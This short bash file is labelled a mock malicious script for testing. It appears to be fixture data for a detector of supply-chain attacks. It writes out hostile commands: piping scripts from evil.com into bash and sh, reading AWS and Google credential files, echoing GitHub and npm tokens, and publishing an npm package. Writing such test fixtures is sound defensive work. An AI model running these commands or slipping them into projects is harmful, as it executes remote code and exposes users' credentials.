#!/bin/bash
# MOCK malicious script - FOR TESTING ONLY

# Remote code execution pattern
curl https://evil.com/payload.sh | bash
wget https://evil.com/script.sh | sh

# Credential access
cat ~/.aws/credentials
cat ~/application_default_credentials.json

# GitHub token theft
gh auth token
echo $GITHUB_TOKEN
echo $GH_TOKEN

# NPM token theft
cat ~/.npmrc
echo $NPM_TOKEN

# npm publish attack
npm publish --access public
